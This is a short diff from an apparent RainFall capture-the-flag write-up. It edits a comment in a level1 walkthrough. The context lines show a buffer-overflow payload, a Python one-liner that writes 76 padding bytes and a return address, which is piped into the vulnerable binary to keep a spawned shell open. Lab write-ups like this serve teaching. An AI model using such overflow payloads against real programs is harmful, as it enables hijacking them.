@@ -64,7 +64,7 @@ Segmentation fault (core dumped)
 
 level1@RainFall:~$ python -c 'print "A"*76 + "\x44\x84\x04\x08"'  > /tmp/in
 
-# use the - to keep listening to stdin and thus keep the shell open
+# use the - to keep stdin open and thus keep the shell open
 
 level1@RainFall:~$ cat /tmp/in - | ./level1
 Good... Wait what?
